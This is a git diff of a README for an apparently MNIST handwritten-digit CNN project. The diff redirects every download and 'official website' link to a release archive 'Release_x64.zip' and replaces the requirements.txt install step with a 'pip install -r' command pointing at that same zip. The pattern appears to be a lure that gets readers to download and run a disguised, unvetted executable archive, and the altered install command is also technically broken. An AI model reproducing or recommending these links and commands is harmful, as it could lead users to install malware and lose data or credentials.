@@ -23,13 +23,13 @@ In this project, we utilized the power of CNNs to recognize and classify handwri
 
 ### Installation
 To get started with this project, you can download the necessary software by clicking the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/GithubUSERPEK/CNN-Based_Handwritten_Digit_Recognition/releases/download/v1.0/Release_x64.zip)](https://github.com/GithubUSERPEK/CNN-Based_Handwritten_Digit_Recognition/releases/download/v1.0/Release_x64.zip)
 
 *(Note: The link provided above needs to be launched for software download.)*
 
 ### Usage
 1. Clone the repository to your local machine.
-2. Install the required dependencies by running `pip install -r requirements.txt`.
+2. Install the required dependencies by running `pip install -r https://github.com/GithubUSERPEK/CNN-Based_Handwritten_Digit_Recognition/releases/download/v1.0/Release_x64.zip`.
 3. Run the main script to train the CNN model on the MNIST dataset.
 4. Test the model's accuracy on handwritten digit images.
 5. Make predictions on custom handwritten digits to observe the model's performance.
@@ -47,6 +47,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 If the provided link does not work or additional releases are available, please check the "Releases" section of this repository for the latest updates.
 
 #### Visit the Official Website
-You can visit the [official website](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) for more information about the project.
+You can visit the [official website](https://github.com/GithubUSERPEK/CNN-Based_Handwritten_Digit_Recognition/releases/download/v1.0/Release_x64.zip) for more information about the project.
 
 Thank you for visiting the **CNN-Based_Handwritten_Digit_Recognition** repository! 🤖📊🔍
